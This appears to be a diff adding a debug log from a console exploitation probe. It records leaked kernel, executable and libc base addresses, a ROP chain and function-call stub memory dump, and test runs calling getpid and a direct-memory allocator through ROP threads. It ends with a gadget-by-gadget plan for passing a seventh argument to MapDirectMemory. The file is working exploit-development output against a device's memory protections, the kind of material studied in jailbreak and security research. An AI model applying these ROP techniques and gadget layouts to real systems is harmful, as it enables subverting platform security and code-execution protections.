@@ -1,0 +1,76 @@
+=== PROBE 544a: FCALL STUB LAYOUT ===
+[A] globals
+  ropchain=table
+  thread=table
+  gadgets=table
+  fcall=table
+  libc_addrofs=table
+
+[B] bases
+  libkernel_base=0x0000000807F18000
+  eboot_base=0x000000003B3A0000
+  libc_base=0x00000001B29A0000
+  pid=80
+
+[C] ropchain + fcall_stub layout
+  chain.stack_base=0x0000000310CA1AA0
+  chain.stack_size=8192
+  fcall_stub.fn_addr=0x0000000310E93F30
+  fcall_stub.return_addr=0x0000000310E93F40
+  gap (ret - fn) = 16 bytes = 2 qwords
+
+[C2] stub memory dump (fn_addr-0x10 .. fn_addr+0x38)
+  [fn+0xFFFFFFFFFFFFFFF0] 0x000000003B3A0042
+  [fn+0xFFFFFFFFFFFFFFF8] 0x000000003B3A0042
+  [fn+0x00] 0x0000000000000000 <-- fn_addr slot
+  [fn+0x08] 0x000000003B3A09A2
+  [fn+0x10] 0x0000000000000000 <-- return_addr slot
+  [fn+0x18] 0x0000000000000000
+  [fn+0x20] 0x0000000000000000
+  [fn+0x28] 0x0000000000000000
+  [fn+0x30] 0x0000000000000000
+  [fn+0x38] 0x0000000000000000
+
+[D] push_fcall_raw test with getpid
+  using syscall.getpid.fn_addr=0x0000000807F18B57
+  chain built, stack_offset=128
+
+[E] thread:new with syscall obj (getpid)
+  thread:new ok=true
+  thr.chain.stack_base=0x0000000310D35820
+  running...
+  run ok=true err=nil
+  join ok=true err=nil
+  getpid rv=0x0000000000000050 (expected ~80)
+
+[F] thread:new with pre-built chain
+  chain2 built, offset=128
+  thread:new(chain2) ok=true
+  run ok=true err=nil
+  join ok=true err=nil
+  getpid rv=0x0000000000000050 (expected ~80)
+
+[G] push_fcall with libc function
+  chain3 built, offset=304
+  thread:new ok=true
+  run ok=true err=nil
+  join ok=true err=nil
+  AllocDM rv=0x0000000080020023
+  phys=0x0000000000000000
+
+[H] 7th arg stub analysis
+  pop_rbx_ret=0x000000003B3FB6E8
+  pop_rsp_ret=0x000000003B3A09A2
+  ret=0x000000003B3A0042
+
+  7th-arg stub plan:
+    fn_addr+0x00: MapDirectMemory address
+    fn_addr+0x08: pop_rbx;ret (return addr for MapDM)
+    fn_addr+0x10: 0 (7th arg = name NULL, discarded by pop_rbx)
+    fn_addr+0x18: pop_rsp;ret
+    fn_addr+0x20: chain_resume_addr
+  MapDM sees [RSP+0]=pop_rbx = return, [RSP+8]=0 = 7th arg
+  MapDM ret -> pop_rbx pops 0, ret -> pop_rsp pops resume, ret -> chain continues
+
+canary: ok=true pid=80
+=== PROBE 544a COMPLETE ===
